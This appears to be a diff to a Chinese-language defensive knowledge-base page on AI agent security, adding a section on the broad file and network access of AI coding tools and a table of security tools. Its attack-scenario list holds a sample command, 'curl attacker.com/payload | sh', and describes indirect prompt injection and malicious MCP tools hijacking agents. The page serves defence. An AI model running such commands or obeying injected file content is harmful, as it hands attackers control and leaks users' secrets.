@@ -22,6 +22,27 @@
 
 **防护：** 白名单工具 + 参数限制、工具调用审计日志、敏感操作二次确认
 
+## AI 编程工具的文件系统和网络访问（2026-05 研究）
+
+**关键发现：** 主流 AI 编程工具（Claude Code、Cursor、Windsurf 等）默认具有广泛的文件系统和网络访问权限。
+
+**风险点：**
+- Agent 可以读取/修改任意项目文件
+- Agent 可以发起任意网络请求（curl、fetch、WebSocket）
+- Agent 可以执行任意 shell 命令
+- 沙箱隔离不充分时，攻击者可通过 prompt injection 控制这些能力
+
+**实际攻击场景：**
+1. 恶意代码注入 → Agent 执行 `curl attacker.com/payload | sh`
+2. 间接 prompt injection → Agent 读取被污染的文件后泄露敏感信息
+3. 供应链攻击 → Agent 加载恶意 MCP 工具后被劫持
+
+**防御要点：**
+- **最小权限原则：** Agent 只应访问必要的文件和网络资源
+- **沙箱隔离：** 使用 OS 级隔离（seccomp/AppArmor/容器）
+- **操作审计：** 记录所有文件和网络操作
+- **人工审批：** 敏感操作（删除、网络请求）需人工确认
+
 ## 权限提升 (Privilege Escalation)
 
 **已验证攻击实例：**
@@ -55,6 +76,15 @@
 
 **防御：** OS 级隔离（seccomp/AppArmor/容器）、限制 symlink、不用 AST 级隔离
 
+## 安全工具与框架（2026-05）
+
+| 工具 | 用途 |
+|------|------|
+| **AgentArmor** | 开源 8 层 AI Agent 安全框架 |
+| **Gecko Security** | AI 代码漏洞扫描（YC F24） |
+| **Semgrep Assistant** | AI 辅助 AppSec 工具 |
+| **MCP-Scan** | MCP Server 安全扫描 |
+
 ---
 
 _→ Prompt Injection 详见 [`ai-security/prompt-injection.md`](prompt-injection.md)_
@@ -66,4 +96,4 @@ _→ MCP 安全详见 [`ai-security/mcp-security.md`](mcp-security.md)_
 
 - **Prompt Injection：** [prompt-injection.md](prompt-injection.md) — 注入技术与防御
 - **MCP 安全：** [mcp-security.md](mcp-security.md) — MCP 协议安全
-- **云安全：** [ttacks/cloud-attacks.md](../attacks/cloud-attacks.md) — 云环境攻击
+- **云安全：** [attacks/cloud-attacks.md](../attacks/cloud-attacks.md) — 云环境攻击
